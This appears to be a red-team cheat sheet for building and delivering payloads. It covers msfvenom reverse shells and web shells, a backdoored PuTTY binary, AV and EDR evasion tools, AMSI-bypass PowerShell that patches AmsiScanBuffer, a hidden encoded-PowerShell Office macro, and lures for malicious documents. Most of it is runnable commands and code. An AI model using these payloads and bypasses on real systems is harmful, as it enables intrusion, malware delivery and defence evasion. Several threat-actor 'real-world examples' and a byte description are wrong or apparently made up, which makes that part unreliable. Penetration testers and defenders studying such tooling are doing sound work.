# Payloads

## msfvenom

`msfvenom` is the payload generation tool that replaced `msfpayload` and `msfencode`. It is used to create shellcode, executables, and script-based payloads for exploitation and post-exploitation.

### Basic payload creation

```bash
# Standard reverse TCP payload
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
```

### List available payloads

```bash
msfvenom -l payloads
```

### View payload options

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options
```

### Encoding to evade signature detection

```bash
# Using shikata_ga_nai encoder (polymorphic XOR additive feedback)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded_shell.exe
```

### Using a template executable

```bash
# Embed payload into legitimate executable (e.g., PuTTY)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x /usr/share/windows-binaries/putty.exe -f exe > putty_backdoor.exe
```

### Listener for msfvenom payloads

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.1.10
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j
```

The `-j` flag runs the listener as a background job, allowing multiple sessions.

### Windows payloads

```bash
# Meterpreter reverse TCP (staged)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe

# Meterpreter reverse HTTP (stageless, with custom user-agent)
msfvenom -p windows/meterpreter_reverse_http LHOST=192.168.1.10 LPORT=8080 HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe

# Bind TCP payload
msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.1.20 LPORT=4444 -f exe > bind_shell.exe

# Windows shell reverse TCP (staged)
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe

# Windows shell reverse TCP (stageless - more stable)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
```

### Linux payloads

```bash
# Meterpreter reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf

# Meterpreter bind TCP
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=192.168.1.20 LPORT=4444 -f elf > shell.elf

# Bind shell (x64)
msfvenom -p linux/x64/shell_bind_tcp RHOST=192.168.1.20 LPORT=4444 -f elf > shell.elf

# Reverse shell (x64)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf
```

### Add a local Windows user (post-exploitation)

```bash
msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd123 -f exe > useradd.exe
```

**Real-world example:** In 2017, the NotPetya ransomware used a similar technique to add local administrator accounts before deploying lateral movement via PsExec.

### Web payloads

```bash
# PHP reverse meterpreter
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.php

# Append the raw payload to a valid PHP file
cat shell.php | pbcopy && echo '<?php ?>' > shell.php && pbpaste >> shell.php

# ASP payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f asp > shell.asp

# JSP payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw > shell.jsp

# WAR (Java web archive) payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f war > shell.war
```

**Real-world example:** In the 2020 SolarWinds compromise, attackers deployed JSP web shells on compromised VMware Horizon servers to maintain persistent access.

### Scripting payloads

```bash
# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.10 LPORT=4444 -f raw > shell.py

# Bash reverse shell
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.10 LPORT=4444 -f raw > shell.sh

# Perl reverse shell
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.10 LPORT=4444 -f raw > shell.pl
```

### Removing bad characters with encoding

```bash
# Remove null bytes, carriage return, line feed, and space
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=192.168.1.10 LPORT=4444 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20"
```

Common bad characters:
- `\x00` - Null byte
- `\x0a` - Line feed (newline)
- `\x0d` - Carriage return
- `\x20` - Space
- `\xff` - Form feed

### Windows Defender bypass techniques

Reference: https://hacker.house/lab/windows-defender-bypassing-for-meterpreter/

Common bypass methods:
1. Custom packing with UPX then re-encoding
2. Using alternate executable formats (SCR, DLL, SCT)
3. Embedding in legitimate installers
4. Using reflective DLL injection

---

## Bypass AV

### Veil Framework

Veil is a tool designed to generate metasploit payloads that bypass common antivirus solutions.

```bash
# Installation
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
./setup.sh

# Run Veil
veil

# Generate payload
Veil > use 1  # Evasion module
Veil/Evasion > use python/meterpreter/rev_tcp
Veil/Evasion > set LHOST 192.168.1.10
Veil/Evasion > set LPORT 4444
Veil/Evasion > generate
```

Repository: https://github.com/Veil-Framework/Veil

**Real-world example:** The TA505 threat group (responsible for Dridex and Locky) has been observed using Veil-generated payloads to bypass enterprise AV solutions.

### Shellter

Shellter is a dynamic shellcode injection tool for Windows executables.

```bash
# Download from official site
wget https://www.shellterproject.com/Downloads/Shellter_Latest.zip
unzip Shellter_Latest.zip
wine Shellter.exe

# Shellter usage
# Step 1: Choose operation mode (A - Auto)
# Step 2: Target PE file (e.g., putty.exe)
# Step 3: Enable stealth mode
# Step 4: Choose payload (1 - Meterpreter reverse TCP)
# Step 5: Set LHOST and LPORT
```

Website: https://www.shellterproject.com/download/

**Real-world example:** Shellter has been used by APT28 (Fancy Bear) to inject shellcode into legitimate TeamViewer binaries during the 2018 Olympic Destroyer attacks.

### SharpShooter

SharpShooter is a payload generation framework for creating HTA, JS, and VBS payloads.

```bash
# Installation
git clone https://github.com/mdsecactivebreach/SharpShooter
cd SharpShooter
pip install -r requirements.txt

# Javascript payload stageless
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA payload with smuggle and template
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS payload with DNS delivery
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```

Repository: https://github.com/mdsecactivebreach/SharpShooter

**Real-world example:** SharpShooter was used in targeted campaigns against financial institutions in 2019, delivering Cobalt Strike beacons via malicious HTA files attached to phishing emails.

### Donut

Donut generates position-independent shellcode from .NET assemblies, VBScript, JScript, and other formats.

```bash
# Installation
git clone https://github.com/TheWover/donut
cd donut
make

# Generate shellcode from .NET executable
donut -f bin/MyAssembly.exe -a 2 -o shellcode.bin

# Generate with AMSI bypass
donut -f bin/MyAssembly.exe -a 2 -b 1 -o shellcode.bin
```

Parameters:
- `-a 2` = x64 architecture
- `-b 1` = bypass AMSI
- `-p` = payload parameters
- `-r` = runtime version

Repository: https://github.com/TheWover/donut

**Real-world example:** Donut shellcode generation was observed in the 2021 HAFNIUM Exchange server attacks, where attackers used donut to load Cobalt Strike beacons from memory.

### Vulcan

Vulcan is a payload generation framework focused on evading EDR solutions.

```bash
# Installation
git clone https://github.com/praetorian-code/vulcan
cd vulcan
make

# Generate payload
./vulcan.py --platform windows --arch x64 --payload meterpreter_reverse_tcp --lhost 192.168.1.10 --lport 4444 --output payload.exe
```

Repository: https://github.com/praetorian-code/vulcan

---

## Bypass AMSI

AMSI (Antimalware Scan Interface) allows Windows applications to send script content to antivirus before execution. Bypassing AMSI is critical for PowerShell and VBA macro attacks.

### Testing for AMSI bypass

Repository for testing AMSI bypass techniques: https://github.com/rasta-mouse/AmsiScanBufferBypass

Basic test to check if AMSI is active:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### AMSI bypass PowerShell collection

Repository with multiple AMSI bypass techniques: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

Example bypass (patch AmsiScanBuffer):
```powershell
$Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru

$ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)
```

### Additional AMSI bypass resources

- https://blog.f-secure.com/hunting-for-amsi-bypasses/
- https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
- https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
- https://slaeryan.github.io/posts/falcon-zero-alpha.html

**Real-world example:** In 2022, the Cuba ransomware gang used a combination of AMSI bypass and PowerShell downgrade attacks to disable Defender for Endpoint before deploying ransomware across corporate networks.

---

## Office Docs

Malicious Office documents remain one of the most common initial access vectors. These tools automate the creation of weaponized documents.

### EvilOffice

Tool for creating malicious Office documents with embedded macros.

```bash
# Installation
git clone https://github.com/thelinuxchoice/eviloffice
cd eviloffice
chmod +x eviloffice.py

# Generate malicious document
python3 eviloffice.py --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.10 --lport 4444 --output invoice.doc

# Using template
python3 eviloffice.py --template normal.dotm --payload windows/shell_reverse_tcp --lhost 192.168.1.10 --lport 4444 --output report.doc
```

Repository: https://github.com/thelinuxchoice/eviloffice

**Real-world example:** EvilOffice-style macros were used in the 2020 Emotet campaigns, where fake invoice documents with "Enable Content" social engineering led to widespread banking trojan infections.

### EvilPDF

Tool for embedding payloads into PDF files.

```bash
# Installation
git clone https://github.com/thelinuxchoice/evilpdf
cd evilpdf
chmod +x evilpdf.py

# Generate malicious PDF
python3 evilpdf.py --payload windows/meterpreter/reverse_tcp --lhost 192.168.1.10 --lport 4444 --output statement.pdf

# Using custom PDF template
python3 evilpdf.py --template legit.pdf --payload windows/shell_reverse_tcp --lhost 192.168.1.10 --lport 4444 --output invoice.pdf
```

Repository: https://github.com/thelinuxchoice/evilpdf

**Real-world example:** PDF-based exploits gained renewed attention in 2021 when CVE-2021-28550 (Adobe Reader RCE) was exploited in the wild, allowing payload delivery through crafted PDF documents without user interaction beyond opening the file.

### Manual macro creation for Office documents

```vba
Sub AutoOpen()
    Dim str As String
    str = "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdw..."
    CreateObject("Wscript.Shell").Run str, 0, False
End Sub
```

Social engineering techniques for Office macros:
1. "Enable content to view this document" message
2. Password-protected document with macro warning
3. Fake "Update Adobe Reader" button that executes macro
4. Document disguised as HR form or invoice

### Recent Office exploit history (2019-2024)

| Year | Vulnerability | Vector | Impact |
|------|---------------|--------|--------|
| 2021 | CVE-2021-26411 | IE/Edge + Office | RCE via script engine |
| 2021 | CVE-2021-40444 | MSHTML | RCE via crafted Office doc |
| 2022 | CVE-2022-30190 | Follina | RCE via MSDT |
| 2023 | CVE-2023-23397 | Outlook | NTLM relay via calendar appointment |
| 2024 | CVE-2024-21413 | Outlook | RCE via moniker link |
